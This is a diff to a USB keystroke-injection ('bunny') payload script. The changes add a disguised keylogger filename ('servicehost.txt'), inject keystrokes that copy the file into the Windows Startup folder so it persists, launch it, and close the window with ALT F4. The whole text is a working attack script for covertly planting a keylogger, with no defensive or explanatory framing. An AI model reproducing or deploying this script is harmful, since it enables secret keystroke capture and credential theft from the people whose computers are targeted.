@@ -14,6 +14,8 @@ ND="1000"
 #LD = Long delay (waiting for programs to start or bash scipts to execute) FASTMODE(standard)=1500 SLOWMODE=3500
 LD="1500"
 
+#KeyloggerName CONFIGURATION
+name=servicehost.txt
 
 #Shutting off CONFIGURATION
 #Edit the line below to shut the bunny off after finishing ("" = turn off / "#" = Do not turn off)
@@ -43,18 +45,20 @@ Q ENTER
 Q DELAY $FD
 Q STRING copy
 Q SPACE
+Q DELAY $ND
 Q CONTROL v
+Q DELAY $FD
 Q BACKSPACE
-Q STRING 'payloads\servicehost.txt' "'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
+Q DELAY $FD
+Q STRING "payloads\\"$name" 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
 Q ENTER
 Q DELAY $FD
-Q STRING start "'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\servicehost.txt'"
-Q ENTER
-Q DELAY $LD
-Q DELAY $LD
-Q STRING exit
-Q ENTER
+Q STRING "start 'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"$name"\'"
 Q DELAY $SFD
+Q ENTER
+Q ALT F4
+Q DELAY $LD
+Q DELAY $LD
 
 #Cleaning up fase
 LED CLEANUP
